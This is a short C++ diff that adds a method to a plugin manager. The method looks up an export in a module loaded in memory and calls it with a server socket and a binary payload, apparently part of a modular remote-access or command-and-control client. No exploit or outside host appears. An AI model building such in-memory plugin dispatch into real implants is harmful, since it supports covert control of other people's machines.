@@ -65,3 +65,17 @@ void PluginManager::executePluginCommand(const std::string& pluginId, const std:
         std::cerr << "[-] Plugin command function not found: " << funcName << std::endl;
     }
 }
+
+void PluginManager::executePluginBinary(const std::string& pluginId, const std::string& funcName, SOCKET serverSock, const std::vector<uint8_t>& payload) {
+    if (!isPluginLoaded(pluginId)) return;
+
+    typedef void (*PluginBinaryEntry)(SOCKET, const uint8_t*, size_t);
+    PluginBinaryEntry func = (PluginBinaryEntry)MemoryLoader::GetExportAddress(loadedPlugins[pluginId], funcName.c_str());
+
+    if (func) {
+        std::cout << "[+] Executing plugin binary: " << pluginId << " -> " << funcName << std::endl;
+        func(serverSock, payload.data(), payload.size());
+    } else {
+        std::cerr << "[-] Plugin binary function not found: " << funcName << std::endl;
+    }
+}
